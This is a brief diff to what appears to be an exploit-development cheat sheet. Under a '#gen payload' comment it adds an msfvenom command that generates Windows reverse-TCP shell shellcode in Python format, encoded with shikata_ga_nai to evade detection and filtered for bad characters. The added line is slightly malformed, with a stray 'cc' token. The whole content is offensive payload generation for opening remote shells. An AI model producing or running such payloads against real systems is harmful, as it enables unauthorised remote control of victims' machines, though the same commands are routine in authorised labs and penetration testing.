@@ -22,3 +22,4 @@
 
 #gen payload
 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -f py -a x86 -b "BADCHARS"
+msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f py cc -e x86/shikata_ga_nai EXITFUNC=thread -b "BADCHARS"
